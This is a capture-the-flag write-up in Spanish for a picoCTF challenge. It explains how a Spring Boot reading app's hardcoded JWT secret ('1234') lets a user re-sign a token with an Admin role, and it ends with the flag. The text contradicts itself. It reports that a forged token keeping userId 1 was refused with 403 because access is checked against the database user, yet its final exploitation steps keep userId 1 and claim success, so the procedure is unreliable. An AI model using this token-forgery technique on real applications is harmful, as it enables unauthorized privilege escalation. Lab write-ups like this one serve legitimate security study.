# Java Code Analysis!?!

## Descripción

BookShelf Pico es una aplicación web de lectura de libros desarrollada en Java Spring Boot. El objetivo era acceder al libro restringido **Flag** y obtener la bandera.
## Credenciales Iniciales

```text
Usuario: user
Contraseña: user
```

---

## Reconocimiento

Tras iniciar sesión, se observó que la aplicación almacenaba un JWT en el navegador.

En DevTools → Application → Local Storage:

```json
{
  "role":"Free",
  "iss":"bookshelf",
  "userId":1,
  "email":"user"
}
```

JWT original:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

---

## Análisis del Código Fuente

Buscando la implementación del JWT:

```java
public JwtService(SecretGenerator secretGenerator){
    this.SECRET_KEY = secretGenerator.getServerSecret();
}
```

El secreto era generado desde:

```java
private String generateRandomString(int len) {
    // not so random
    return "1234";
}
```

Vulnerabilidad encontrada:

```java
return "1234";
```

El secreto de firma JWT estaba hardcodeado.

---

## Forjado del JWT

Payload original:

```json
{
  "role":"Free",
  "iss":"bookshelf",
  "userId":1,
  "email":"user"
}
```

Payload modificado:

```json
{
  "role":"Admin",
  "iss":"bookshelf",
  "userId":1,
  "email":"Admin"
}
```

Se firmó nuevamente utilizando:

```text
Secret: 1234
Algoritmo: HS256
```

---

## Problema Encontrado

Aunque el JWT indicaba:

```json
{
  "role":"Admin"
}
```

las peticiones al PDF devolvían:

```http
403 Forbidden
```

Analizando el código:

```java
@PostAuthorize("@bookPdfAccessCheck.verify(#bookId, authentication.principal.grantedAuthorities[0].userId)")
public PDF getPdf(Integer bookId)
```

y:

```java
public boolean verify(Integer bookId, Integer userId) {
    ...
    boolean permissionGranted =
        (user.getRole().getValue() >= book.getRole().getValue());

    return permissionGranted;
}
```

La autorización no dependía únicamente del JWT, sino también del usuario recuperado desde la base de datos mediante el `userId` contenido en el token.

---

## Explotación

1. Obtener el JWT original.
    
2. Analizar el código fuente.
    
3. Identificar el secreto JWT:
    

```text
1234
```

4. Modificar el payload:
    

```json
{
  "role":"Admin",
  "userId":1,
  "email":"Admin"
}
```

5. Firmar nuevamente con HS256 usando la clave:
    

```text
1234
```

6. Reemplazar el JWT almacenado en `localStorage`.
    
7. Recargar la aplicación.
    
8. Acceder al libro restringido **Flag**.
    

---

## Flag

```text
picoCTF{w34k_jwt_n0t_g00d_602ce414}
```
